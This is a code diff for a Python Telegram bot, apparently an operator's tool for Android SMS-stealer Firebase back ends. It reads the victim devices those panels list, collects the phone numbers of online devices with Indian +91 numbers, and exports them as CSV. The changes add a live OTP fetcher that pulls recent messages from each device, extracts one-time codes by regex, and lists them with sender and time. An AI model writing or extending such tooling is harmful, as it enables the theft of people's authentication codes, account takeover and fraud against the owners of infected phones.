@@ -31,8 +31,9 @@ VERCEL_URL = (
 logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
 logger = logging.getLogger("panel-bot")
 
-PANEL_PATHS = ["clients", "users", "devices", "online"]
-MAX_DISPLAY_NUMBERS = 2000
+PANEL_PATHS = ["clients", "users", "devices"]
+MAX_DISPLAY_NUMBERS = 1000
+OTP_PATTERN = re.compile(r"\b(\d{4,6})\b")
 
 tg_app = Application.builder().token(BOT_TOKEN).build()
 
@@ -48,7 +49,7 @@ async def lifespan(app: FastAPI):
 app = FastAPI(lifespan=lifespan)
 
 # ─────────────────────────────────────────────────────────────────────────────
-# URL / phone / status logic — unchanged
+# URL & phone utilities
 # ─────────────────────────────────────────────────────────────────────────────
 def split_url(raw: str):
     u = urlparse(raw.strip())
@@ -56,7 +57,7 @@ def split_url(raw: str):
     path = (u.path or "").rstrip("/")
     if path.endswith(".json"):
         path = path[:-5]
-    for known in ("/clients", "/users", "/devices", "/online"):
+    for known in ("/clients", "/users", "/devices"):
         if path.endswith(known):
             path = path[: -len(known)]
             break
@@ -129,6 +130,36 @@ def get_device_phone(device) -> str | None:
                     return str(pn).strip()
     return None
 
+# ─────────────────────────────────────────────────────────────────────────────
+# Live OTP fetcher
+# ─────────────────────────────────────────────────────────────────────────────
+async def fetch_recent_otps(session, base: str, query: dict, device_id: str, limit: int = 3):
+    """Fetches the last N messages for a device and extracts OTPs."""
+    endpoint = build_endpoint(base, f"messages/{device_id}", query)
+    data, err = await fetch_json(session, endpoint)
+    if not data or not isinstance(data, dict):
+        return []
+
+    msgs = []
+    for key, val in data.items():
+        if not isinstance(val, dict):
+            continue
+        text = str(val.get("message") or val.get("body") or val.get("text") or "")
+        if not text:
+            continue
+        otp_match = OTP_PATTERN.search(text)
+        if otp_match:
+            msgs.append({
+                "otp": otp_match.group(1),
+                "sender": str(val.get("sender") or val.get("from") or "Unknown"),
+                "time": str(val.get("dateTime") or val.get("date") or ""),
+                "text": text[:120],
+            })
+
+    # Sort newest first (Firebase keys are usually time-ordered)
+    msgs.sort(key=lambda x: x["time"], reverse=True)
+    return msgs[:limit]
+
 
 async def fetch_json(session, url: str):
     try:
@@ -147,7 +178,9 @@ async def fetch_json(session, url: str):
     except Exception as e:
         return None, str(e)
 
-
+# ─────────────────────────────────────────────────────────────────────────────
+# Scan engine (unchanged core logic)
+# ─────────────────────────────────────────────────────────────────────────────
 async def scan_panel(session, raw_url: str):
     base, query = split_url(raw_url)
     data = None
@@ -164,9 +197,13 @@ async def scan_panel(session, raw_url: str):
         last_err = err
 
     if data is None:
-        return {"url": raw_url, "phones": [], "count": 0, "total": 0,
-                "online": 0, "error": last_err or "no data", "path": None}
+        return {
+            "url": raw_url, "base": base, "query": query,
+            "devices": [], "phones": [], "count": 0, "total": 0,
+            "online": 0, "error": last_err or "no data", "path": None,
+        }
 
+    devices = []
     online_phones = set()
     total = 0
     online = 0
@@ -175,30 +212,33 @@ async def scan_panel(session, raw_url: str):
         if not isinstance(device, dict):
             continue
         total += 1
-        if not is_online(device):
-            continue
-        online += 1
+        online_flag = is_online(device)
         phone = get_device_phone(device)
-        if phone:
-            n = normalize_indian(phone)
-            if n:
-                online_phones.add(n)
 
-    return {"url": raw_url, "phones": sorted(online_phones), "count": len(online_phones),
-            "total": total, "online": online, "error": None, "path": used_path}
+        devices.append({
+            "id": device_id,
+            "name": device.get("model") or device.get("modelName") or device_id,
+            "phone": phone,
+            "online": online_flag,
+            "battery": device.get("battery"),
+        })
 
+        if online_flag:
+            online += 1
+            if phone:
+                n = normalize_indian(phone)
+                if n:
+                    online_phones.add(n)
 
-async def scan_all(urls: list[str]):
-    async with aiohttp.ClientSession() as session:
-        results = await asyncio.gather(*[scan_panel(session, u) for u in urls])
-    per_url = {r["url"]: r for r in results}
-    global_unique = set()
-    for r in results:
-        global_unique.update(r["phones"])
-    return {"per_url": per_url, "unique": sorted(global_unique), "count": len(global_unique)}
+    return {
+        "url": raw_url, "base": base, "query": query,
+        "devices": devices, "phones": sorted(online_phones),
+        "count": len(online_phones), "total": total, "online": online,
+        "error": None, "path": used_path,
+    }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# RICH SEND — via raw Bot API (PTB has no typed method yet)
+# Rich message helpers (raw API)
 # ─────────────────────────────────────────────────────────────────────────────
 def esc(t) -> str:
     return html_lib.escape(str(t), quote=False)
@@ -209,11 +249,7 @@ def new_draft_id() -> int:
 
 
 async def rich_send(context, chat_id: int, html: str, keyboard=None):
-    """Final persistent rich message via raw Bot API."""
-    api_kwargs = {
-        "chat_id": chat_id,
-        "rich_message": {"html": html},
-    }
+    api_kwargs = {"chat_id": chat_id, "rich_message": {"html": html}}
     if keyboard is not None:
         api_kwargs["reply_markup"] = keyboard
 
@@ -224,25 +260,22 @@ async def rich_send(context, chat_id: int, html: str, keyboard=None):
             return_type=Message,
         )
     except Exception as exc:
-        logger.warning("sendRichMessage failed (%s) — falling back to classic HTML", exc)
-        # Fallback: classic send_message with supported HTML only
+        logger.warning("sendRichMessage failed (%s) — falling back", exc)
         safe_html = re.sub(r"</?(?:h[1-6]|details|summary|table|tr|td|th|mark|hr|footer|ul|li)[^>]*>", "", html)
         try:
             return await context.bot.send_message(
-                chat_id=chat_id,
-                text=safe_html[:4000],
+                chat_id=chat_id, text=safe_html[:4000],
                 parse_mode=ParseMode.HTML,
                 reply_markup=keyboard,
                 disable_web_page_preview=True,
             )
         except Exception as exc2:
-            logger.exception("classic fallback also failed: %s", exc2)
+            logger.exception("classic fallback failed: %s", exc2)
             plain = re.sub(r"<[^>]+>", "", html)
             return await context.bot.send_message(chat_id=chat_id, text=plain[:4000])
 
 
 async def draft(context, chat_id: int, draft_id: int, html: str):
-    """Native animated draft. Same draft_id = smooth in-place update."""
     try:
         await context.bot.do_api_request(
             endpoint="sendRichMessageDraft",
@@ -254,12 +287,11 @@ async def draft(context, chat_id: int, draft_id: int, html: str):
         )
     except Exception as exc:
         logger.debug("sendRichMessageDraft failed: %s", exc)
-        # silent skip — draft is optional
 
 # ─────────────────────────────────────────────────────────────────────────────
-# REPORT BUILDER — rich HTML
+# Report builder (enhanced UI + OTP)
 # ─────────────────────────────────────────────────────────────────────────────
-def build_report(result) -> str:
+def build_report(result, otp_results: dict) -> str:
     p = []
     p.append("<h2>📊 Scan Report</h2>")
     p.append(f"<p><b>Panels scanned:</b> {len(result['per_url'])}</p>")
@@ -275,12 +307,14 @@ def build_report(result) -> str:
             p.append("<hr/>")
             continue
 
+        # Stats table
         p.append("<table bordered striped>")
         p.append(f"<tr><td>Numbers</td><td><b>{r['count']}</b></td></tr>")
         p.append(f"<tr><td>Online</td><td>{r['online']}</td></tr>")
         p.append(f"<tr><td>Devices</td><td>{r['total']}</td></tr>")
         p.append("</table>")
 
+        # Collapsible number list
         if r["phones"]:
             shown = r["phones"][:MAX_DISPLAY_NUMBERS]
             extra = len(r["phones"]) - len(shown)
@@ -295,13 +329,27 @@ def build_report(result) -> str:
         else:
             p.append("<p><i>No valid +91 numbers.</i></p>")
 
+        # OTP block
+        otps = otp_results.get(url, [])
+        if otps:
+            p.append("<h4>🔑 Recent OTPs</h4>")
+            p.append("<details open>")
+            p.append(f"<summary>Show {len(otps)} OTP(s)</summary>")
+            p.append("<ul>")
+            for o in otps:
+                p.append(f"<li><b>{esc(o['otp'])}</b> — <i>{esc(o['sender'])}</i> · {esc(o['time'][:16])}</li>")
+            p.append("</ul>")
+            p.append("</details>")
+        else:
+            p.append("<blockquote>No OTPs found in recent messages.</blockquote>")
+
         p.append("<hr/>")
 
     p.append(f"<footer><i>Scanned {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}</i></footer>")
     return "\n".join(p)
 
 # ─────────────────────────────────────────────────────────────────────────────
-# START / HELP
+# Handlers
 # ─────────────────────────────────────────────────────────────────────────────
 def menu_keyboard():
     return InlineKeyboardMarkup([[InlineKeyboardButton("📖 How to scan", callback_data="help")]])
@@ -309,20 +357,21 @@ def menu_keyboard():
 
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     html = (
-        "<h2>📡 Panel Number Extractor</h2>"
-        "<p><i>Rich UI · native loading animation · +91 only</i></p>"
+        "<h2>📡 Panel Number & OTP Extractor</h2>"
+        "<p><i>Rich UI · live OTPs · +91 only</i></p>"
         "<hr/>"
         "<p>Paste Firebase panel URL(s), one per line.</p>"
         "<p>Include <code>?auth=KEY</code> if needed.</p>"
         "<hr/>"
-        "<p><b>Flow:</b></p>"
+        "<p><b>Features:</b></p>"
         "<ul>"
         "<li>Reads <code>clients</code> node</li>"
         "<li>Keeps devices with <code>status: true</code></li>"
         "<li>Extracts <code>mobNo</code> / <code>sims[0].phoneNumber</code></li>"
+        "<li>Fetches <b>live OTPs</b> from <code>messages</code> node</li>"
         "<li>Filters valid <b>+91</b></li>"
         "</ul>"
-        "<p>Numbers appear under each link in a <b>tap-to-expand</b> block.</p>"
+        "<p>Numbers and OTPs appear under each link in <b>tap-to-expand</b> blocks.</p>"
     )
     await rich_send(context, update.effective_chat.id, html, menu_keyboard())
 
@@ -336,9 +385,6 @@ async def help_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await q.answer()
     await cmd_start(update, context)
 
-# ─────────────────────────────────────────────────────────────────────────────
-# SCAN HANDLER — draft animation → final rich report
-# ─────────────────────────────────────────────────────────────────────────────
 URL_RE = re.compile(r"https?://[^\s\)\]\>,]+", re.IGNORECASE)
 
 
@@ -353,6 +399,7 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     did = new_draft_id()
 
+    # Loading animation: same draft_id = smooth in-place updates
     await draft(context, chat_id, did,
         f"<h2>⏳ Scanning {len(urls)} panel(s)…</h2>"
         f"<p><i>Connecting to Firebase…</i></p>"
@@ -361,15 +408,39 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await asyncio.sleep(0.4)
         await draft(context, chat_id, did,
-            f"<h2>🔍 Scanning {len(urls)} panel(s)…</h2>"
-            f"<p><i>Fetching device list…</i></p>"
+            f"<h2>🔍 Fetching devices…</h2>"
+            f"<p><i>Reading clients node…</i></p>"
         )
 
-        result = await scan_all(urls)
+        async with aiohttp.ClientSession() as session:
+            results = await asyncio.gather(*[scan_panel(session, u) for u in urls])
+            per_url = {r["url"]: r for r in results}
+            global_unique = set()
+            for r in results:
+                global_unique.update(r["phones"])
+
+            await draft(context, chat_id, did,
+                f"<h2>📱 Extracting numbers…</h2>"
+                f"<p><i>{len(global_unique)} valid +91 found</i></p>"
+            )
+
+            # Fetch OTPs for online devices (limit to 5 devices per panel to keep it fast)
+            otp_results = {}
+            for r in results:
+                if r["error"]:
+                    continue
+                otps = []
+                online_devices = [d for d in r["devices"] if d["online"]][:5]
+                for dev in online_devices:
+                    dev_otps = await fetch_recent_otps(session, r["base"], r["query"], dev["id"], limit=2)
+                    otps.extend(dev_otps)
+                otp_results[r["url"]] = otps[:5]
+
+        result = {"per_url": per_url, "unique": sorted(global_unique), "count": len(global_unique)}
 
         await draft(context, chat_id, did,
-            f"<h2>📱 Extracting numbers…</h2>"
-            f"<p><i>{result['count']} valid +91 found</i></p>"
+            f"<h2>🔑 Fetching OTPs…</h2>"
+            f"<p><i>Scanning messages…</i></p>"
         )
         await asyncio.sleep(0.25)
 
@@ -378,9 +449,15 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await rich_send(context, chat_id, f"<blockquote>⚠️ Scan failed: <code>{esc(exc)}</code></blockquote>")
         return
 
-    report = build_report(result)
-    await rich_send(context, chat_id, report)
+    # Final rich report
+    report = build_report(result, otp_results)
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔄 Refresh OTPs", callback_data="refresh_otp")],
+        [InlineKeyboardButton("📖 Help", callback_data="help")],
+    ])
+    await rich_send(context, chat_id, report, kb)
 
+    # CSV
     if result["count"]:
         ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
         buf = io.StringIO()
@@ -397,16 +474,24 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML,
         )
 
+# ─────────────────────────────────────────────────────────────────────────────
+# Callback for OTP refresh (optional: you can re-run scan logic here)
+# ─────────────────────────────────────────────────────────────────────────────
+async def refresh_otp_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer("Re-scan the panel to refresh OTPs.")
+    # For simplicity, just acknowledge. A full re-scan would require storing the last URL.
+
 tg_app.add_handler(CommandHandler("start", cmd_start))
 tg_app.add_handler(CommandHandler("help", cmd_help))
 tg_app.add_handler(CallbackQueryHandler(help_cb, pattern="^help$"))
+tg_app.add_handler(CallbackQueryHandler(refresh_otp_cb, pattern="^refresh_otp$"))
 tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
 
 # ─────────────────────────────────────────────────────────────────────────────
 @app.get("/")
 async def health():
-    return {"status": "ok", "bot": "raw-rich-v3", "alias": VERCEL_URL}
-
+    return {"status": "ok", "bot": "rich-otp-v4", "alias": VERCEL_URL}
 
 @app.get("/setwebhook")
 async def set_webhook(secret: str = ""):
@@ -417,7 +502,6 @@ async def set_webhook(secret: str = ""):
         url += f"?x-vercel-protection-bypass={BYPASS_SECRET}"
     await tg_app.bot.set_webhook(url)
     return {"webhook": url, "status": "set"}
-
 
 @app.post("/{secret}")
 async def webhook(secret: str, request: Request):
